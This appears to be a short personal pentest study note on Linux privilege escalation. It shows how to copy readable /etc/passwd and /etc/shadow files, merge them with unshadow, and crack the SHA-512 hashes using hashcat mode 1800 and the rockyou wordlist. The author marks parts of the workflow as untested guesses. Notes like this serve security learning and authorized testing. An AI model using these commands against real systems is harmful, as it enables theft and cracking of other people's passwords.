If you have read permissions set on shadow file, then you can unshadow it and then start cracking hashes.
#### Enum
![[Weak File Permissions#^52dfd9]]
Copy+Paste `/etc/passwd` and `/etc/shadow` from cat output and paste it over to your attack machine. 
#### Exploit
```bash
# built into kali, may need to be installed anywhere else
# /etc/passwd -> passwd
# /etc/shadow -> shadow
unshadow <passwd> <shadow>
unshadow ./passwd ./shadow

# then copy+paste the users with an associated hash/login to a new unshadow file
```
Check the hash [here](https://hashcat.net/wiki/doku.php?id=hashcat), search for the number between the dollar signs, in this case it should start with `$6$`, which is `sha512`. In hashcat, this is the mode `1800`:

Not sure if you can directly run hashcat against the unshadow file, but probably not. Most likely take out the hash after the `$6$` to a colon, then run **only** the hash through hashcat. will see in practice whenever I find that vector. 
```
hashcat -m 1800 hash /usr/share/wordlist/rockyou.txt
```
